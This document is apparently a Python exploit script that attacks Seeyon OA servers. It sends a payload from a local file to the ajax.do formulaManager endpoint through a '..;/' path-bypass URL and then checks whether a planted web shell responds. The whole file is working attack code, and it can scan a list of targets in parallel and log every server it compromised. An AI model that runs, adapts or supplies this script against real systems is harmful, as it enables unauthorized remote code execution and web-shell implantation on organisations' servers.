#@author:九世
#@time:2021.1.15
#@file:exp.py
from concurrent.futures import ProcessPoolExecutor
import requests
import optparse

class Exploit(object):
    def __init__(self):
        self.headers={"User-Agent":"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52","Content-Type": "application/x-www-form-urlencoded"}
        self.data="managerMethod=validate&arguments={}".format(open("shell.txt","r").read())
        self.path="/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip"
        self.shellpath=open("path.txt","r",encoding="utf-8").read()
    def send(self,url):
        try:
            rqt=requests.post(url=url.rstrip("/")+self.path,headers=self.headers,data=self.data,proxies={"http":"http://127.0.0.1:8080"})
            shellurl=url.rstrip("/")+self.shellpath
            rqt2=requests.get(url=shellurl)
            if rqt2.status_code==200:
                print("\n[+] getshell Sucess url:{}".format(shellurl))
                print("[+] getshell Sucess url:{}".format(shellurl),file=open("save.txt","a",encoding="utf-8"))
            else:
                print("\r [-] getshell failure url:{}  ajaxpathcode:{} shellpathcode:{}    ".format(url,rqt.status_code,rqt2.status_code),end="")
        except Exception as error:
            print("[error] Request url:{} error:{}".format(url,error))
            print("[error] Request url:{} error:{}".format(url, error),file=open("error.log","a",encoding="utf-8"))

    def run(self,file,number):
        data=open(file,"r",encoding="utf-8").read().split("\n")
        with ProcessPoolExecutor(int(number)) as Pro:
            Pro.map(self.send,data)

if __name__ == '__main__':
    obj=Exploit()
    parser=optparse.OptionParser()
    parser.add_option('-u',dest='url',help='待检测的u'r'l')
    parser.add_option('-f',dest='file',help='批量检测')
    parser.add_option('-t',dest='process',help='指定线程')
    option,args=parser.parse_args()
    if option.url:
        obj.send(option.url)
    elif option.file and option.process:
        obj.run(option.file,option.process)

    else:
        parser.print_help()
        print("python exp.py -u <url>")
        print("python exp.py -f <file> -t <number>")
